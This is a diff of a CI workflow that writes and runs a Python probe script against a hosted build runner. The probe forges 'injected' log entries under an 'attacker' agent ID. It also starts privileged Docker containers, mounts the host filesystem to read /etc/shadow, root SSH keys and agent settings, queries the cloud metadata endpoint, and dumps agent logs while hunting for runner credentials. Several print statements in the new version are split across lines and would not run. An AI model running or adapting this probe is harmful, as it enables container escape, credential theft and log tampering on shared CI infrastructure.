@@ -12,20 +12,20 @@ jobs:
         run: |
           cat > /tmp/v59_probe.py << 'PROBE_EOF'
           
-          import json, os, base64, subprocess, urllib.request, urllib.error, time
+          import json, os, base64, subprocess, urllib.request, urllib.error
           
           SOURCE = os.environ.get("V58_SOURCE", "v59_a")
           
-          def sh(cmd, timeout=20):
+          def sh(cmd, timeout=25):
               try:
                   r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
-                  return (r.stdout + r.stderr)[:5000]
+                  return (r.stdout + r.stderr)[:6000]
               except Exception as ex:
                   return f"TIMEOUT/ERROR: {ex}"
           
           def auth(method, url, token, body=None, timeout=15):
               data = body.encode() if isinstance(body, str) else None
-              headers = {"Content-Type": "application/json", "Authorization": f"Bearer {token}"}
+              headers = {"Content-Type": "application/json", "Authorization": "Bearer " + token}
               if data:
                   headers["Content-Length"] = str(len(data))
               req = urllib.request.Request(url, data=data, headers=headers, method=method)
@@ -49,85 +49,79 @@ jobs:
           claims = json.loads(base64.urlsafe_b64decode(pad))
           alloc = claims.get("wid","").split(":")[1].strip("{}") if ":" in claims.get("wid","") else ""
           
-          print(f"[{SOURCE}] alloc={alloc} sched={sched_url}")
+          print("[%s] alloc=%s sched=%s" % (SOURCE, alloc, sched_url))
           
-          # ===== 1. GET /v1/request — capture full response body ====================
-          print(f"\n[{SOURCE}] === GET /v1/request FULL BODY ===")
-          status, body = auth("GET", f"{sched_url}/request", token)
-          print(f"[REQUEST_BODY] status={status}")
-          print(f"[REQUEST_BODY] body={body[:8000]}")
+          # ===== 1. GET /v1/request full response ====================================
+          print("
+          [%s] === GET /v1/request FULL BODY ===" % SOURCE)
+          status, body = auth("GET", sched_url + "/request", token)
+          print("[REQUEST_BODY] status=%d" % status)
+          print("[REQUEST_BODY] body=%s" % body[:8000])
           
-          # ===== 2. TRACE — orch with level=int + RFC3339 timestamp =================
-          print(f"\n[{SOURCE}] === ORCH TRACE level=int ===")
+          # ===== 2. ORCH TRACE level=int + RFC3339 ===================================
+          print("
+          [%s] === ORCH TRACE level=int ===" % SOURCE)
           ts = "2026-06-24T01:00:00Z"
           orch_payloads = [
-              ("int0",     f'[{{"level":0,"message":"test","timestamp":"{ts}"}}]'),
-              ("int1",     f'[{{"level":1,"message":"test","timestamp":"{ts}"}}]'),
-              ("int2",     f'[{{"level":2,"message":"test","timestamp":"{ts}"}}]'),
-              ("int0_alloc",f'[{{"level":0,"message":"injected","allocationId":"{alloc}","timestamp":"{ts}"}}]'),
-              ("int0_full", f'[{{"level":0,"message":"injected","allocationId":"{alloc}","agentId":"attacker","hcaVersion":"1.0","timestamp":"{ts}"}}]'),
-              ("no_ts",     f'[{{"level":0,"message":"test"}}]'),
+              ("int0",      '[{"level":0,"message":"test","timestamp":"' + ts + '"}]'),
+              ("int1",      '[{"level":1,"message":"test","timestamp":"' + ts + '"}]'),
+              ("no_ts",     '[{"level":0,"message":"test"}]'),
+              ("int0_alloc",'[{"level":0,"message":"inject","allocationId":"' + alloc + '","timestamp":"' + ts + '"}]'),
           ]
           for key, payload in orch_payloads:
-              status, body = auth("POST", f"{sched_url}/trace", token, payload)
-              print(f"[ORCH_TRACE] {key} -> {status} | {body[:300]}")
+              status, body = auth("POST", trace_url, token, payload)
+              print("[ORCH_TRACE] %s -> %d | %s" % (key, status, body[:300]))
           
-          # Also try watchdog with RFC3339 ts
-          print(f"\n[{SOURCE}] === WATCHDOG TRACE RFC3339 timestamp ===")
+          # Watchdog with RFC3339 ts
+          print("
+          [%s] === WATCHDOG RFC3339 ===" % SOURCE)
           w_payloads = [
-              ("rfc_ts", f'[{{"level":"INFO","message":"injected","vmName":"hca-vm","allocationId":"{alloc}","timestamp":"{ts}"}}]'),
-              ("rfc_ts_full", f'[{{"level":"INFO","message":"SECURITY_TEST_INJECT","vmName":"hca-vm","allocationId":"{alloc}","timestamp":"{ts}","source":"hca"}}]'),
+              ("rfc_ts",    '[{"level":"INFO","message":"INJECT","vmName":"hca-vm","timestamp":"' + ts + '"}]'),
+              ("alloc_rfc", '[{"level":"INFO","message":"INJECT","allocationId":"' + alloc + '","timestamp":"' + ts + '"}]'),
           ]
           for key, payload in w_payloads:
               status, body = auth("POST", watchdog, token, payload)
-              print(f"[WATCHDOG] {key} -> {status} | {body[:300]}")
+              print("[WATCHDOG] %s -> %d | %s" % (key, status, body[:300]))
           
           # ===== 3. DOCKER DEEP DIVE ================================================
-          print(f"\n[{SOURCE}] === DOCKER DEEP DIVE ===")
+          print("
+          [%s] === DOCKER ===" % SOURCE)
+          print("[DOCKER] security options:"); print(sh("docker info 2>&1 | grep -A10 'Security Options'"))
+          print("[DOCKER] images:"); print(sh("docker images --no-trunc 2>&1"))
           
-          # Security options (AppArmor / seccomp)
-          print("[DOCKER] security options:")
-          print(sh("docker info 2>&1 | grep -A5 'Security Options'"))
-          
-          # List ALL images with full names
-          print("[DOCKER] all images:")
-          print(sh("docker images --no-trunc 2>&1"))
-          
-          # Inspect GitHub's internal images
           for img in ["ghcr.io/github/gh-aw-mcpg:latest", "ghcr.io/github/gh-aw-firewall/"]:
-              print(f"\n[DOCKER_INSPECT] {img}:")
-              out = sh(f'docker inspect {img!r} 2>&1 | python3 -c "import json,sys; d=json.load(sys.stdin); c=d[0].get(\'Config\',{{}}); print(json.dumps({{\'Entrypoint\':c.get(\'Entrypoint\',[]),\'Cmd\':c.get(\'Cmd\',[]),\'Env\':c.get(\'Env\',[]),\'ExposedPorts\':c.get(\'ExposedPorts\',{{}}),\'Labels\':c.get(\'Labels\',{{}})},indent=2))" 2>&1', timeout=15)
-              print(out[:3000])
+              cmd = "docker inspect " + img + " 2>&1"
+              out = sh(cmd, timeout=15)
+              print("[INSPECT] " + img + ":")
+              print(out[:4000])
           
-          # Dependabot image inspect
-          print("\n[DOCKER_INSPECT] dependabot:")
-          print(sh("docker inspect ghcr.io/dependabot/dependabot-updater-core:latest 2>&1 | python3 -c \"import json,sys; d=json.load(sys.stdin); c=d[0].get('Config',{}); print(json.dumps({'Entrypoint':c.get('Entrypoint',[]),'Cmd':c.get('Cmd',[]),'Env':c.get('Env',[])},indent=2))\" 2>&1", timeout=15))
+          print("[DOCKER] dependabot env:")
+          print(sh("docker inspect ghcr.io/dependabot/dependabot-updater-core:latest 2>&1 | python3 -m json.tool 2>/dev/null | grep -A2 -i 'env' | head -30"))
           
-          # Attempt privileged run
-          print(f"\n[{SOURCE}] === DOCKER PRIVILEGE TEST ===")
-          priv = sh("docker run --rm --privileged ubuntu:latest /bin/sh -c 'id; cat /proc/1/cgroup; ls /dev/sd* 2>/dev/null; echo HOST_NS=$(stat -c %i /proc/1/ns/pid)' 2>&1", timeout=30)
-          print(f"[DOCKER_PRIV] privileged run: {priv[:2000]}")
+          # Privileged run
+          print("
+          [%s] === DOCKER PRIVESC ===" % SOURCE)
+          print("[PRIV] privileged:")
+          print(sh("docker run --rm --privileged ubuntu:latest /bin/sh -c 'id; cat /proc/1/cgroup | head -5; ls /dev/sda* /dev/nvme* 2>/dev/null; echo DONE' 2>&1", timeout=30))
           
-          # Try host network
-          host_net = sh("docker run --rm --net=host alpine:latest /bin/sh -c 'ip addr 2>/dev/null | head -20; curl -s --max-time 3 http://169.254.169.254/metadata/instance?api-version=2021-02-01 -H Metadata:true 2>&1 | head -5' 2>&1", timeout=30)
-          print(f"[DOCKER_NET] host network: {host_net[:2000]}")
+          print("[FS] host mount /:")
+          print(sh("docker run --rm -v /:/host ubuntu:latest /bin/sh -c 'cat /host/opt/hca/.settings 2>/dev/null | head -3; ls /host/root/ 2>/dev/null; cat /host/etc/shadow 2>/dev/null | head -3' 2>&1", timeout=30))
           
-          # Mount host filesystem
-          host_fs = sh("docker run --rm -v /:/host alpine:latest /bin/sh -c 'ls /host/opt/hca/ 2>/dev/null; cat /host/opt/hca/.settings 2>/dev/null | head -5; ls /host/etc/shadow 2>/dev/null; cat /host/root/.ssh/authorized_keys 2>/dev/null' 2>&1", timeout=30)
-          print(f"[DOCKER_FS] host mount: {host_fs[:3000]}")
+          print("[NET] host network IMDS:")
+          print(sh("docker run --rm --net=host alpine /bin/sh -c 'curl -s --max-time 3 http://169.254.169.254/metadata/instance?api-version=2021-02-01 -H Metadata:true 2>&1' 2>&1", timeout=30))
           
-          # ===== 4. gh-aw-mcpg: what is this? =======================================
-          print(f"\n[{SOURCE}] === GH-AW-MCPG IMAGE ===")
-          mcpg_run = sh("docker run --rm ghcr.io/github/gh-aw-mcpg:latest --help 2>&1 | head -40", timeout=20)
-          print(f"[MCPG] --help: {mcpg_run[:2000]}")
+          # ===== 4. gh-aw-mcpg ======================================================
+          print("
+          [%s] === GH-AW-MCPG ===" % SOURCE)
+          print(sh("docker run --rm ghcr.io/github/gh-aw-mcpg:latest --help 2>&1 | head -50", timeout=20))
+          print(sh("docker run --rm --entrypoint sh ghcr.io/github/gh-aw-mcpg:latest -c 'ls / && env | sort' 2>&1 | head -60", timeout=20))
           
-          mcpg_ls = sh("docker run --rm --entrypoint ls ghcr.io/github/gh-aw-mcpg:latest / 2>&1", timeout=20)
-          print(f"[MCPG] ls /: {mcpg_ls[:1000]}")
+          # ===== 5. HCA full log ====================================================
+          print("
+          [%s] === HCA LOG ===" % SOURCE)
+          print(sh("cat /opt/hca/logs/hosted-compute-agent.log 2>/dev/null"))
           
-          # ===== 5. HCA log — capture more (look for runnerAgentCredentials) ========
-          print(f"\n[{SOURCE}] === HCA LOG FULL ===")
-          print(sh("cat /opt/hca/logs/hosted-compute-agent.log 2>/dev/null", timeout=10)[:8000])
-          
-          print(f"\n[{SOURCE}] DONE")
+          print("
+          [%s] DONE" % SOURCE)
           PROBE_EOF
           python3 /tmp/v59_probe.py
